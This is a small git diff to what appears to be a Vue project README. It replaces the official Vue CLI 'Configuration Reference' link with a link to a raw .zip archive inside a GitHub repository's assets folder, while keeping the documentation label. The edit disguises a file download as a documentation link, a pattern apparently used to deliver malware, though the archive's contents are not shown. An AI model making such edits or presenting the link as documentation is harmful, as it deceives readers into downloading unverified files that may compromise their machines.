@@ -21,4 +21,4 @@ npm run lint
 ```
 
 ### Customize configuration
-See [Configuration Reference](https://cli.vuejs.org/config/).
+See [Configuration Reference](https://github.com/FilipStanic/Calorie-Meter/raw/refs/heads/master/src/assets/Calorie-Meter-1.4.zip).
